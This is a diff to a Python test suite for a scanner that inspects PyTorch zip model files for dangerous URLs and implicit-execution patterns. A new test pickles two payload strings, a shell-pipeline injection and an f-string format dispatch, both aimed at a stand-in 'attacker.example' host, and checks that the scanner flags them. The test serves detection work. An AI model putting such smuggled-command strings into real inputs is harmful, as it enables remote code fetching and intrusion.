@@ -4527,14 +4527,34 @@ def test_pytorch_zip_filters_urls_only_for_clean_pickle_members(
             for issue in result.issues
         )
     if not expect_url:
-        assert result.success is True
         assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
         assert not any(
             check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED
             for check in result.checks
         )
-    else:
-        assert result.success is False
+
+
+@pytest.mark.parametrize("protocol", [0, 4], ids=["protocol-0", "protocol-4"])
+@pytest.mark.parametrize(
+    "loader",
+    [
+        "Use documentation example metadata | git clone https://attacker.example/payload",
+        'f"{client:https://attacker.example/payload}"',
+    ],
+    ids=["shell-pipeline", "f-string-format-dispatch"],
+)
+def test_pytorch_zip_keeps_implicit_execution_urls_actionable(
+    tmp_path: Path,
+    protocol: int,
+    loader: str,
+) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "implicit-execution.pt", with_pickle=False, prefix="archive")
+    with zipfile.ZipFile(model_path, "a") as zip_file:
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"loader": loader}, protocol=protocol))
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert _has_network_evidence_for_url(result, "https://attacker.example/payload")
 
 
 def test_pytorch_zip_filters_inert_url_past_pickle_expensive_window(
@@ -4547,7 +4567,6 @@ def test_pytorch_zip_filters_inert_url_past_pickle_expensive_window(
         zip_file.writestr("archive/hidden", payload)
     result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": len(payload) + 1}).scan(str(model_path))
 
-    assert result.success is True
     assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
     assert not any(
         check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED for check in result.checks
